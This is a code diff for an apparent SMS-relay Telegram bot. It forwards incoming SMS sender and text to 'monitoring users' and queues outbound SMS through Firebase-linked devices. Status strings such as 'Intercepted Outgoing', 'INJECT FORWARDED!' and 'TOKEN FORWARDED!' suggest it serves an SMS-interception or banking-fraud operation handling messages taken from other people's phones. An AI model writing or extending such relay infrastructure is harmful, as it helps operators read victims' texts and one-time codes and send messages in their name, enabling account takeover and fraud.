@@ -176,8 +176,42 @@ async def _deliver_monitoring_started(
     await bot.send_message(chat_id=chat_id, text=startup_card, parse_mode="HTML")
     await bot.send_message(chat_id=chat_id, text=stream_card, parse_mode="HTML")
 
-    if profile.channel_id and settings.telegram_bot_token:
-        await _post_to_channel(bot, profile.channel_id, monitoring_card)
+
+async def notify_new_sms_dm_only(sms: SMSMessage, relay_ms: int = 3) -> None:
+    if not settings.telegram_bot_token:
+        return
+
+    db: Session = SessionLocal()
+    try:
+        monitoring_users = get_monitoring_user_ids(db, sms)
+        if not monitoring_users and settings.allowed_user_ids:
+            monitoring_users = settings.allowed_user_ids
+    finally:
+        db.close()
+
+    if not monitoring_users:
+        return
+
+    from telegram import Bot
+
+    bot = Bot(token=settings.telegram_bot_token)
+    stream_card = format_virtus_stream_card(
+        sms.sender,
+        sms.message,
+        queued_ms=relay_ms or 3,
+        total_ms=relay_ms + 8,
+    )
+
+    results = await asyncio.gather(
+        *(
+            bot.send_message(chat_id=user_id, text=stream_card, parse_mode="HTML")
+            for user_id in monitoring_users
+        ),
+        return_exceptions=True,
+    )
+    for result in results:
+        if isinstance(result, Exception):
+            logger.error("Telegram DM notify failed: %s", result)
 
 
 async def notify_new_sms(sms: SMSMessage) -> None:
@@ -229,27 +263,7 @@ async def notify_new_sms(sms: SMSMessage) -> None:
         db.close()
 
     relay_ms = int((time.perf_counter() - t0) * 1000)
-    stream_card = format_virtus_stream_card(
-        sms.sender,
-        sms.message,
-        queued_ms=relay_ms or 3,
-        total_ms=relay_ms + 15,
-    )
-
-    db = SessionLocal()
-    try:
-        notify_tasks = []
-        for user_id in monitoring_users:
-            notify_tasks.append(
-                bot.send_message(chat_id=user_id, text=stream_card, parse_mode="HTML")
-            )
-
-        results = await asyncio.gather(*notify_tasks, return_exceptions=True)
-        for result in results:
-            if isinstance(result, Exception):
-                logger.error("Telegram notify failed: %s", result)
-    finally:
-        db.close()
+    asyncio.create_task(notify_new_sms_dm_only(sms, relay_ms=relay_ms))
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -419,11 +433,14 @@ def _is_virtus_bot_message(text: str) -> bool:
     markers = (
         "INJECT FORWARDED!",
         "TOKEN FORWARDED!",
+        "OUTGOING SMS SENT!",
+        "Intercepted Outgoing",
         "Real SMS ->",
         STARTUP_TEST_MESSAGE,
         "Test message sent:",
         "AUTO-STOPPED",
         "✅ SUCCESS",
+        "⏱ queued",
     )
     return any(marker in text for marker in markers)
 
@@ -451,8 +468,6 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             if not profile.sim_selected:
                 continue
             try:
-                if device.firebase_source_url:
-                    device = await sync_device_from_firebase(db, device)
                 outbound = await queue_channel_sms_with_firebase(
                     db,
                     profile,
@@ -468,7 +483,6 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
                     queued_ms=relay_ms,
                     total_ms=relay_ms + 3,
                 )
-                await message.reply_text(confirm_card, parse_mode="HTML")
                 try:
                     await update.get_bot().send_message(
                         chat_id=profile.telegram_user_id,
@@ -479,7 +493,14 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
                     logger.debug("Owner DM confirm failed: %s", exc)
             except Exception as exc:
                 logger.error("Channel relay failed: %s", exc)
-                await message.reply_text(f"❌ Send failed: {exc}")
+                try:
+                    await update.get_bot().send_message(
+                        chat_id=profile.telegram_user_id,
+                        text=f"❌ Channel send failed: {exc}",
+                        parse_mode="HTML",
+                    )
+                except Exception as dm_exc:
+                    logger.debug("Owner DM error notify failed: %s", dm_exc)
     finally:
         db.close()
 
